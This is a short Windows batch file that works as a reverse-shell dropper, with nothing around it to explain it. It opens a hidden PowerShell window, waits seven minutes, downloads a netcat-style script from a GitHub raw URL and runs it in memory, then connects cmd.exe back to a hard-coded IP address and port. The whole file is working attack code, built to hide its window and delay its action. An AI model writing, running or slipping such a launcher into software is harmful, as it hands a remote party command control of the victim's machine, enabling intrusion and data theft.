@echo off
start /min powershell.exe -WindowStyle Hidden -Command "Start-Sleep -Seconds 420; IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/huyremy/netcat/main/power.ps1'); huyremy -c 97.74.89.193 -p 6868 -e cmd.exe"
exit㄀
